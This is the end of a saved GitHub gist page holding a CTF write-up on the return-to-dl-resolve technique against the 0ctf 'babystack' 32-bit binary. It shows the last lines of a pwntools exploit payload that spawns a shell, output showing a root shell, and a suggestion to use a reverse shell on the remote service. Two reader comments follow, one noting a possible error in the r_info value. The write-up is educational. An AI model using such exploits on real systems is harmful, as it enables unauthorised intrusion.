+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">buf</span><span class="pl-c1">+</span><span class="pl-c1">100</span>)         <span class="pl-c"># system parameter</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-s1">elf32_rel</span>            <span class="pl-c"># (buf+0x14)</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-s">'A'</span> <span class="pl-c1">*</span> <span class="pl-s1">align</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-s1">elf32_sym_struct</span>     <span class="pl-c"># (buf+0x20)</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-s">"system<span class="pl-cce">\x00</span>"</span>
+<span class="pl-s1">p</span> <span class="pl-c1">=</span> (<span class="pl-c1">100</span> <span class="pl-c1">-</span> <span class="pl-en">len</span>(<span class="pl-s1">buffer2</span>))
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-s">'A'</span> <span class="pl-c1">*</span> <span class="pl-s1">p</span>              <span class="pl-c">#padding</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-s">"sh<span class="pl-cce">\x00</span>"</span>
+<span class="pl-s1">p</span> <span class="pl-c1">=</span> (<span class="pl-c1">0x80</span> <span class="pl-c1">-</span> <span class="pl-en">len</span>(<span class="pl-s1">buffer2</span>))
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-s">"A"</span> <span class="pl-c1">*</span> <span class="pl-s1">p</span>              <span class="pl-c">#total read size</span>
+
+<span class="pl-s1">r</span>.<span class="pl-en">send</span>(<span class="pl-s1">buffer</span> <span class="pl-c1">+</span> <span class="pl-s1">buffer2</span>)
+<span class="pl-s1">r</span>.<span class="pl-en">interactive</span>()</pre></div>
+<div class="highlight highlight-source-shell"><pre><span class="pl-c"><span class="pl-c">#</span> python exploit_my.py</span>
+[+] Starting <span class="pl-k">local</span> process <span class="pl-s"><span class="pl-pds">'</span>./babystack<span class="pl-pds">'</span></span>: pid 1987
+[<span class="pl-k">*</span>] <span class="pl-s"><span class="pl-pds">'</span>/root/CTF/0ctf/babystack<span class="pl-pds">'</span></span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[<span class="pl-k">*</span>] Switching to interactive mode
+$ whoami
+root
+$  </pre></div>
+<p>Awesome! We have successfully exploited this binary on our local machine.
+However, this payload wil not work for the remote babystack service because whose stdout redirected to /dev/null.
+To get the flag, change the "sh" command with a reverse shell command, send the new payload to the remote server and wait for the vulnerable machine to connect back to your host and open shell.</p>
+<h1><a id="user-content-8-conclusion" class="anchor" aria-hidden="true" href="#8-conclusion"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>8. Conclusion</h1>
+<p>All things consider, return-to dl-resolve is one of the most interesting techniques I have ever used because neither libc remote version nor leaking addresses is required to call functions not imported by the elf explicitly.<br>
+Despite the fact that  additional gadgets and address leaks are still required on 64-bit environment, the principle is the same.
+To automate the payload crafting process easier, roputils library from inaz2 can be used. This great tool has support for various return-to techniques, including the one described in this article [7].
+Should you have any questions or remarks, please contact me: <a href="mailto:ricardoungureanu@gmail.com">ricardoungureanu@gmail.com</a></p>
+<hr>
+[1] <a href="http://phrack.org/issues/58/4.html" rel="nofollow">http://phrack.org/issues/58/4.html</a><br>
+[2] <a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" rel="nofollow">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a> <br>
+[3] <a href="http://www.gabriel.urdhr.fr/2015/01/22/elf-linking/" rel="nofollow">http://www.gabriel.urdhr.fr/2015/01/22/elf-linking/</a><br>
+[4] <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" rel="nofollow">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a><br>
+[5] <a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/" rel="nofollow">https://manybutfinite.com/post/anatomy-of-a-program-in-memory/</a> <br>
+[6] <a href="https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter3-7.html" rel="nofollow">https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter3-7.html</a><br>
+[7] <a href="https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py">https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py</a> <br>
+</article>
+  </div>
+
+  </div>
+</div>
+
+
+    <a name="comments"></a>
+    <div class="js-quote-selection-container" data-quote-markdown=".js-comment-body">
+      <div class="js-discussion js-socket-channel"
+           data-channel="eyJjIjoibWFya2VkLWFzLXJlYWQ6NTUzMDk3MzUiLCJ0IjoxNjAyNTMzNTMyfQ==--d36a7f7176c247db3fa1f47348fd78c3abc59ad3ae1b8183cf7d48cb8770b04f"
+           data-channel-target="MDQ6R2lzdDhjN2Y2ZjViODk1MGVkNjc3MWMxY2QzYTExNmY3ZTYy"
+      >
+        <div class="ml-md-6 pl-md-3 ml-0 pl-0">
+          
+  <div class="TimelineItem js-comment-container">
+      
+<div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
+  <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/an0n5urf/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/an0n5urf"><img class="avatar rounded-1 avatar-user" height="40" width="40" alt="@an0n5urf" src="https://avatars2.githubusercontent.com/u/32772497?s=88&amp;v=4" /></a>
+
+</div>
+
+
+    <div class="timeline-comment-group js-minimizable-comment-group js-targetable-element TimelineItem-body my-0 " id="gistcomment-3368132">
+    <div class="ml-n3 minimized-comment position-relative  d-none ">
+      
+
+  
+
+  <details class="Details-element details-reset border rounded-1 bg-white"
+       data-body-version="50585be4e3159a71c874c590d2ba12ec">
+    <summary class="bg-gray border-bottom-0 py-0 px-2">
+      <div class="d-flex flex-justify-between flex-items-center">
+        <h3 class="timeline-comment-header-text f5 text-gray text-normal text-italic">
+              This comment has been minimized.
+
+        </h3>
+        <div class="Details-content--closed text-gray f6 no-wrap"><svg class="octicon octicon-unfold position-relative mr-1" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.177.677l2.896 2.896a.25.25 0 01-.177.427H8.75v1.25a.75.75 0 01-1.5 0V4H5.104a.25.25 0 01-.177-.427L7.823.677a.25.25 0 01.354 0zM7.25 10.75a.75.75 0 011.5 0V12h2.146a.25.25 0 01.177.427l-2.896 2.896a.25.25 0 01-.354 0l-2.896-2.896A.25.25 0 015.104 12H7.25v-1.25zm-5-2a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5zM6 8a.75.75 0 01-.75.75h-.5a.75.75 0 010-1.5h.5A.75.75 0 016 8zm2.25.75a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5zM12 8a.75.75 0 01-.75.75h-.5a.75.75 0 010-1.5h.5A.75.75 0 0112 8zm2.25.75a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5z"></path></svg>Show comment</div>
+        <div class="Details-content--open text-gray f6 no-wrap"><svg class="octicon octicon-fold position-relative mr-1" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M10.896 2H8.75V.75a.75.75 0 00-1.5 0V2H5.104a.25.25 0 00-.177.427l2.896 2.896a.25.25 0 00.354 0l2.896-2.896A.25.25 0 0010.896 2zM8.75 15.25a.75.75 0 01-1.5 0V14H5.104a.25.25 0 01-.177-.427l2.896-2.896a.25.25 0 01.354 0l2.896 2.896a.25.25 0 01-.177.427H8.75v1.25zm-6.5-6.5a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5zM6 8a.75.75 0 01-.75.75h-.5a.75.75 0 010-1.5h.5A.75.75 0 016 8zm2.25.75a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5zM12 8a.75.75 0 01-.75.75h-.5a.75.75 0 010-1.5h.5A.75.75 0 0112 8zm2.25.75a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5z"></path></svg>Hide comment</div>
+      </div>
+    </summary>
+    <div class="review-comment border-top pt-3">
+      <div class="previewable-edit  js-task-list-container reorderable-task-lists">
+        <div class="edit-comment-hide">
+          <div class="timeline-comment-actions">
+            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<details class="details-overlay details-reset position-relative d-inline-block ">
+  <summary class="btn-link timeline-comment-action link-gray">
+    <svg aria-label="Show options" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" version="1.1" width="16" height="16" role="img"><path d="M8 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zM1.5 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm13 0a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path></svg>
+  </summary>
+  <details-menu class="dropdown-menu dropdown-menu-sw show-more-popover text-gray-dark anim-scale-in" style="width:185px">
+        <clipboard-copy
+    class="dropdown-item btn-link"
+    for="gistcomment-3368132-minimized-permalink"
+    role="menuitem"
+    
+    >
+    Copy link
+  </clipboard-copy>
+
+        <button
+    type="button"
+    class="dropdown-item btn-link d-none js-comment-quote-reply"
+    role="menuitem">
+    Quote reply
+  </button>
+
+        <div role="none" class="dropdown-divider"></div>
+
+            <a aria-label="Report abusive content" role="menuitem" class="dropdown-item btn-link" data-ga-click="Report content, reported by NONE" href="/contact/report-content?content_url=https%3A%2F%2Fgist.github.com%2F8c7f6f5b8950ed6771c1cd3a116f7e62%23gistcomment-3368132&amp;report=an0n5urf+%28user%29">
+        Report content
+</a>
+      
+  </details-menu>
+</details>
+
+          </div>
+            <a class="float-left mt-1" data-hovercard-type="user" data-hovercard-url="/users/an0n5urf/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/an0n5urf"><img class="avatar avatar-user" height="28" width="28" alt="@an0n5urf" src="https://avatars3.githubusercontent.com/u/32772497?s=60&amp;v=4" /></a>
+          <div class="review-comment-contents">
+            <h4 class="f5 text-normal d-inline text-gray-dark">
+              <strong class="text-gray">
+                
+
+  <a class="author link-gray-dark css-truncate-target " show_full_name="false" data-hovercard-type="user" data-hovercard-url="/users/an0n5urf/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/an0n5urf">an0n5urf</a>
+  
+
+              </strong>
+              <span class="text-gray">
+                  <a href="#gistcomment-3368132" id="gistcomment-3368132-minimized-permalink" class="link-gray"><relative-time datetime="2020-07-08T10:43:25Z" class="no-wrap">Jul 8, 2020</relative-time></a>
+              </span>
+            </h4>
+            
+
+            
+            <task-lists disabled sortable>
+              <div class="comment-body markdown-body p-0 pt-1 js-comment-body ">
+                  <p>:)</p>
+              </div>
+            </task-lists>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </details>
+
+
+    </div>
+    <div class="ml-n3 timeline-comment unminimized-comment comment previewable-edit js-task-list-container js-comment timeline-comment--caret reorderable-task-lists "
+        data-body-version="50585be4e3159a71c874c590d2ba12ec"
+        data-unfurl-hide-url="/content_reference_attachments/hide">
+      <input type="hidden" value="5DEyX4nYRodcflyB6WCQ+mWUbuMFg/emGc2QD3BNS6dblgHxuOsynhl3er0LguMB8bi6F8pbfeHcOhgwt9v0cQ==" data-csrf="true" class="js-data-unfurl-hide-url-csrf" />
+
+      
+<div class="timeline-comment-header clearfix d-block d-sm-flex">
+  <div class="timeline-comment-actions flex-shrink-0">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<details class="details-overlay details-reset position-relative d-inline-block ">
+  <summary class="btn-link timeline-comment-action link-gray">
+    <svg aria-label="Show options" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" version="1.1" width="16" height="16" role="img"><path d="M8 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zM1.5 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm13 0a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path></svg>
+  </summary>
+  <details-menu class="dropdown-menu dropdown-menu-sw show-more-popover text-gray-dark anim-scale-in" style="width:185px">
+        <clipboard-copy
+    class="dropdown-item btn-link"
+    for="gistcomment-3368132-permalink"
+    role="menuitem"
+    
+    >
+    Copy link
+  </clipboard-copy>
+
+        <button
+    type="button"
+    class="dropdown-item btn-link d-none js-comment-quote-reply"
+    role="menuitem">
+    Quote reply
+  </button>
+
+        <div role="none" class="dropdown-divider"></div>
+
+            <a aria-label="Report abusive content" role="menuitem" class="dropdown-item btn-link" data-ga-click="Report content, reported by NONE" href="/contact/report-content?content_url=https%3A%2F%2Fgist.github.com%2F8c7f6f5b8950ed6771c1cd3a116f7e62%23gistcomment-3368132&amp;report=an0n5urf+%28user%29">
+        Report content
+</a>
+      
+  </details-menu>
+</details>
+
+  </div>
+
+  <div class="d-none d-sm-flex">
+
+    
+
+
+  
+
+  </div>
+
+  <h3 class="timeline-comment-header-text f5 text-normal">
+
+
+        <a class="d-inline-block d-md-none" data-hovercard-type="user" data-hovercard-url="/users/an0n5urf/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/an0n5urf"><img class="avatar rounded-1 avatar-user" height="20" width="20" alt="@an0n5urf" src="https://avatars3.githubusercontent.com/u/32772497?s=60&amp;v=4" /></a>
+
+    <strong class="css-truncate">
+      
+
+  <a class="author link-gray-dark css-truncate-target width-fit" show_full_name="false" data-hovercard-type="user" data-hovercard-url="/users/an0n5urf/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/an0n5urf">an0n5urf</a>
+  
+
+    </strong>
+
+
+    commented
+
+
+      <a href="#gistcomment-3368132" id="gistcomment-3368132-permalink" class="link-gray js-timestamp"><relative-time datetime="2020-07-08T10:43:25Z" class="no-wrap">Jul 8, 2020</relative-time></a>
+
+
+    <span class="js-comment-edit-history">
+    </span>
+  </h3>
+</div>
+
+
+      <div class="edit-comment-hide">
+
+        
+<task-lists disabled sortable>
+<table class="d-block" data-paste-markdown-skip>
+  <tbody class="d-block">
+    <tr class="d-block">
+      <td class="d-block comment-body markdown-body  js-comment-body">
+          <p>:)</p>
+      </td>
+    </tr>
+  </tbody>
+</table>
+</task-lists>
+
+
+      </div>
+
+
+    </div>
+</div>
+
+  </div>
+  <div class="TimelineItem js-comment-container">
+      
+<div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
+  <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/pskrgag/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/pskrgag"><img class="avatar rounded-1 avatar-user" height="40" width="40" alt="@pskrgag" src="https://avatars3.githubusercontent.com/u/53155781?s=88&amp;u=8429aeec0d193b2e1efaab00fead6f75f1dd0b21&amp;v=4" /></a>
+
+</div>
+
+
+    <div class="timeline-comment-group js-minimizable-comment-group js-targetable-element TimelineItem-body my-0 " id="gistcomment-3483923">
+    <div class="ml-n3 minimized-comment position-relative  d-none ">
+      
+
+  
+
+  <details class="Details-element details-reset border rounded-1 bg-white"
+       data-body-version="bcf388286443307ba662256aaec3ff5c">
+    <summary class="bg-gray border-bottom-0 py-0 px-2">
+      <div class="d-flex flex-justify-between flex-items-center">
+        <h3 class="timeline-comment-header-text f5 text-gray text-normal text-italic">
+              This comment has been minimized.
+
+        </h3>
+        <div class="Details-content--closed text-gray f6 no-wrap"><svg class="octicon octicon-unfold position-relative mr-1" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.177.677l2.896 2.896a.25.25 0 01-.177.427H8.75v1.25a.75.75 0 01-1.5 0V4H5.104a.25.25 0 01-.177-.427L7.823.677a.25.25 0 01.354 0zM7.25 10.75a.75.75 0 011.5 0V12h2.146a.25.25 0 01.177.427l-2.896 2.896a.25.25 0 01-.354 0l-2.896-2.896A.25.25 0 015.104 12H7.25v-1.25zm-5-2a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5zM6 8a.75.75 0 01-.75.75h-.5a.75.75 0 010-1.5h.5A.75.75 0 016 8zm2.25.75a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5zM12 8a.75.75 0 01-.75.75h-.5a.75.75 0 010-1.5h.5A.75.75 0 0112 8zm2.25.75a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5z"></path></svg>Show comment</div>
+        <div class="Details-content--open text-gray f6 no-wrap"><svg class="octicon octicon-fold position-relative mr-1" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M10.896 2H8.75V.75a.75.75 0 00-1.5 0V2H5.104a.25.25 0 00-.177.427l2.896 2.896a.25.25 0 00.354 0l2.896-2.896A.25.25 0 0010.896 2zM8.75 15.25a.75.75 0 01-1.5 0V14H5.104a.25.25 0 01-.177-.427l2.896-2.896a.25.25 0 01.354 0l2.896 2.896a.25.25 0 01-.177.427H8.75v1.25zm-6.5-6.5a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5zM6 8a.75.75 0 01-.75.75h-.5a.75.75 0 010-1.5h.5A.75.75 0 016 8zm2.25.75a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5zM12 8a.75.75 0 01-.75.75h-.5a.75.75 0 010-1.5h.5A.75.75 0 0112 8zm2.25.75a.75.75 0 000-1.5h-.5a.75.75 0 000 1.5h.5z"></path></svg>Hide comment</div>
+      </div>
+    </summary>
+    <div class="review-comment border-top pt-3">
+      <div class="previewable-edit  js-task-list-container reorderable-task-lists">
+        <div class="edit-comment-hide">
+          <div class="timeline-comment-actions">
+            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<details class="details-overlay details-reset position-relative d-inline-block ">
+  <summary class="btn-link timeline-comment-action link-gray">
+    <svg aria-label="Show options" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" version="1.1" width="16" height="16" role="img"><path d="M8 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zM1.5 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm13 0a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path></svg>
+  </summary>
+  <details-menu class="dropdown-menu dropdown-menu-sw show-more-popover text-gray-dark anim-scale-in" style="width:185px">
+        <clipboard-copy
+    class="dropdown-item btn-link"
+    for="gistcomment-3483923-minimized-permalink"
+    role="menuitem"
+    
+    >
+    Copy link
+  </clipboard-copy>
+
+        <button
+    type="button"
+    class="dropdown-item btn-link d-none js-comment-quote-reply"
+    role="menuitem">
+    Quote reply
+  </button>
+
+        <div role="none" class="dropdown-divider"></div>
+
+            <a aria-label="Report abusive content" role="menuitem" class="dropdown-item btn-link" data-ga-click="Report content, reported by NONE" href="/contact/report-content?content_url=https%3A%2F%2Fgist.github.com%2F8c7f6f5b8950ed6771c1cd3a116f7e62%23gistcomment-3483923&amp;report=pskrgag+%28user%29">
+        Report content
+</a>
+      
+  </details-menu>
+</details>
+
+          </div>
+            <a class="float-left mt-1" data-hovercard-type="user" data-hovercard-url="/users/pskrgag/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/pskrgag"><img class="avatar avatar-user" height="28" width="28" alt="@pskrgag" src="https://avatars0.githubusercontent.com/u/53155781?s=60&amp;u=8429aeec0d193b2e1efaab00fead6f75f1dd0b21&amp;v=4" /></a>
+          <div class="review-comment-contents">
+            <h4 class="f5 text-normal d-inline text-gray-dark">
+              <strong class="text-gray">
+                
+
+  <a class="author link-gray-dark css-truncate-target " show_full_name="false" data-hovercard-type="user" data-hovercard-url="/users/pskrgag/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/pskrgag">pskrgag</a>
+  
+
+              </strong>
+              <span class="text-gray">
+                  <a href="#gistcomment-3483923" id="gistcomment-3483923-minimized-permalink" class="link-gray"><relative-time datetime="2020-10-09T20:36:52Z" class="no-wrap">Oct 9, 2020</relative-time></a>
+              </span>
+            </h4>
+            
+
+            
+            <task-lists disabled sortable>
+              <div class="comment-body markdown-body p-0 pt-1 js-comment-body ">
+                  <p>Cool article, thx for it! I think You should add that <code>ELF32_R_TYPE(r_info)</code> must be equal to 7, because of assertion in dl-runtime.c, but in your example <code>r_info == 0x2100</code>, which means that R_TYPE is 0 :)</p>
+              </div>
+            </task-lists>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </details>
+
+
+    </div>
+    <div class="ml-n3 timeline-comment unminimized-comment comment previewable-edit js-task-list-container js-comment timeline-comment--caret reorderable-task-lists "
+        data-body-version="bcf388286443307ba662256aaec3ff5c"
+        data-unfurl-hide-url="/content_reference_attachments/hide">
+      <input type="hidden" value="D1lPSFZ4l4alnHEQaShE4n7Zj/cVRd+OFJGFKy6a/1Ow/nzmZ0vjn+CVVyyLyjcZ6vVbA9qdVcnRZg0U6QxAhQ==" data-csrf="true" class="js-data-unfurl-hide-url-csrf" />
+
+      
+<div class="timeline-comment-header clearfix d-block d-sm-flex">
+  <div class="timeline-comment-actions flex-shrink-0">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<details class="details-overlay details-reset position-relative d-inline-block ">
+  <summary class="btn-link timeline-comment-action link-gray">
+    <svg aria-label="Show options" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" version="1.1" width="16" height="16" role="img"><path d="M8 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zM1.5 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm13 0a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path></svg>
+  </summary>
+  <details-menu class="dropdown-menu dropdown-menu-sw show-more-popover text-gray-dark anim-scale-in" style="width:185px">
+        <clipboard-copy
+    class="dropdown-item btn-link"
+    for="gistcomment-3483923-permalink"
+    role="menuitem"
+    
+    >
+    Copy link
+  </clipboard-copy>
+
+        <button
+    type="button"
+    class="dropdown-item btn-link d-none js-comment-quote-reply"
+    role="menuitem">
+    Quote reply
+  </button>
+
+        <div role="none" class="dropdown-divider"></div>
+
+            <a aria-label="Report abusive content" role="menuitem" class="dropdown-item btn-link" data-ga-click="Report content, reported by NONE" href="/contact/report-content?content_url=https%3A%2F%2Fgist.github.com%2F8c7f6f5b8950ed6771c1cd3a116f7e62%23gistcomment-3483923&amp;report=pskrgag+%28user%29">
+        Report content
+</a>
+      
+  </details-menu>
+</details>
+
+  </div>
+
+  <div class="d-none d-sm-flex">
+
+    
+
+
+  
+
+  </div>
+
+  <h3 class="timeline-comment-header-text f5 text-normal">
+
+
+        <a class="d-inline-block d-md-none" data-hovercard-type="user" data-hovercard-url="/users/pskrgag/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/pskrgag"><img class="avatar rounded-1 avatar-user" height="20" width="20" alt="@pskrgag" src="https://avatars0.githubusercontent.com/u/53155781?s=60&amp;u=8429aeec0d193b2e1efaab00fead6f75f1dd0b21&amp;v=4" /></a>
+
+    <strong class="css-truncate">
+      
+
+  <a class="author link-gray-dark css-truncate-target width-fit" show_full_name="false" data-hovercard-type="user" data-hovercard-url="/users/pskrgag/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/pskrgag">pskrgag</a>
+  
+
+    </strong>
+
+
+    commented
+
+
+      <a href="#gistcomment-3483923" id="gistcomment-3483923-permalink" class="link-gray js-timestamp"><relative-time datetime="2020-10-09T20:36:52Z" class="no-wrap">Oct 9, 2020</relative-time></a>
+
+
+    <span class="js-comment-edit-history">
+    </span>
+  </h3>
+</div>
+
+
+      <div class="edit-comment-hide">
+
+        
+<task-lists disabled sortable>
+<table class="d-block" data-paste-markdown-skip>
+  <tbody class="d-block">
+    <tr class="d-block">
+      <td class="d-block comment-body markdown-body  js-comment-body">
+          <p>Cool article, thx for it! I think You should add that <code>ELF32_R_TYPE(r_info)</code> must be equal to 7, because of assertion in dl-runtime.c, but in your example <code>r_info == 0x2100</code>, which means that R_TYPE is 0 :)</p>
+      </td>
+    </tr>
+  </tbody>
+</table>
+</task-lists>
+
+
+      </div>
+
+
+    </div>
+</div>
+
+  </div>
+
+<!-- Rendered timeline since 2020-10-09 13:36:52 -->
+<div id="partial-timeline-marker"
+      class="js-timeline-marker js-updatable-content"
+      data-last-modified="Fri, 09 Oct 2020 20:36:52 GMT"
+      >
+</div>
+
+        </div>
+
+        <div class="discussion-timeline-actions">
+            <div class="pl-0 pl-md-6 ml-md-3 ml-0 timeline-comment-wrapper timeline-new-comment js-comment-container width-fit">
+  <div class="d-md-block d-none">
+    <span class="timeline-comment-avatar "><a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/wechicken456/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/wechicken456"><img class="avatar avatar-user" src="https://avatars3.githubusercontent.com/u/55309735?s=80&amp;v=4" width="40" height="40" alt="@wechicken456" /></a></span>
+  </div>
+
+  <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-new-comment-form js-needs-timeline-marker-header" action="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/comments" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="fNbfe1ugAyBH2IYKFWDS7Vx5/me2MXxisuIk2yJQtxP0hypJRpAmZMgg1PPhyyIxNtkAuMSeT7ZCNp3ly9HB9Q==" />
+    <div class="border-md border-0 timeline-comment">
+      <tab-container class="js-previewable-comment-form previewable-comment-form write-selected" data-preview-url="/preview?markdown_unsupported=false&amp;subject=8c7f6f5b8950ed6771c1cd3a116f7e62&amp;subject_type=Gist">
+  <input type="hidden" value="taXrd8W6ZSngoYkimtd6kK6zTNkz9heCKMMbS6WClQc7QhCKQsJ4mPTxBqsNJPPm6zlEPpAVeB4N2jJRD8OCqg==" data-csrf="true" class="js-data-preview-url-csrf" />
+  <div class="comment-form-head tabnav d-flex flex-justify-between mb-2 p-0 tabnav--responsive d-flex flex-column border-bottom-0 mb-0 mb-lg-2 flex-items-stretch border-lg-bottom border-gray-dark flex-lg-items-center flex-lg-row">
+      <div class="tabnav-tabs mx-0 mx-md-2 mt-0 mt-md-2 no-wrap d-flex flex-auto d-md-block" role="tablist">
+        <button type="button" class="btn-link tabnav-tab write-tab js-write-tab  px-3 px-sm-6 px-md-3 flex-1 flex-md-auto" role="tab" aria-selected="true">Write</button>
+        <button type="button" class="btn-link tabnav-tab preview-tab js-preview-tab flex-1 flex-md-auto" role="tab">Preview</button>
+      </div>
+      <markdown-toolbar
+  role="toolbar"
+  aria-label="Composition"
+  for="new_comment_field"
+  class="js-details-container Details toolbar-commenting d-flex no-wrap flex-items-start flex-wrap px-2 pt-2 pt-lg-0 border-md-top border-lg-top-0"
+>
+  <div class="d-block d-md-none flex-auto">
+    <button data-md-button tabindex="-1" type="button" aria-label="Toggle text tools" aria-expanded="false" class="js-details-target btn-link toolbar-item no-underline py-2 mr-1">
+      <svg class="octicon octicon-typography" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M6.21 8.5L4.574 3.594 2.857 8.5H6.21zm.5 1.5l.829 2.487a.75.75 0 001.423-.474L5.735 2.332a1.216 1.216 0 00-2.302-.018l-3.39 9.688a.75.75 0 001.415.496L2.332 10H6.71zm3.13-4.358C10.53 4.374 11.87 4 13 4c1.5 0 3 .939 3 2.601v5.649a.75.75 0 01-1.448.275C13.995 12.82 13.3 13 12.5 13c-.77 0-1.514-.231-2.078-.709-.577-.488-.922-1.199-.922-2.041 0-.694.265-1.411.887-1.944C11 7.78 11.88 7.5 13 7.5h1.5v-.899c0-.54-.5-1.101-1.5-1.101-.869 0-1.528.282-1.84.858a.75.75 0 11-1.32-.716zM14.5 9H13c-.881 0-1.375.22-1.637.444-.253.217-.363.5-.363.806 0 .408.155.697.39.896.249.21.63.354 1.11.354.732 0 1.26-.209 1.588-.449.35-.257.412-.495.412-.551V9z"></path></svg>
+      <svg class="octicon octicon-chevron-up Details-content--shown" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.22 9.78a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 0l4.25 4.25a.75.75 0 01-1.06 1.06L8 6.06 4.28 9.78a.75.75 0 01-1.06 0z"></path></svg>
+      <svg class="octicon octicon-chevron-down Details-content--hidden" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12.78 6.22a.75.75 0 010 1.06l-4.25 4.25a.75.75 0 01-1.06 0L3.22 7.28a.75.75 0 011.06-1.06L8 9.94l3.72-3.72a.75.75 0 011.06 0z"></path></svg>
+    </button>
+  </div>
+
+  
+
+  <div class="flex-nowrap d-none d-md-inline-block mr-3">
+    <md-header tabindex="-1" class="toolbar-item tooltipped tooltipped-n mx-1" aria-label="Add header text" data-ga-click="Markdown Toolbar, click, header">
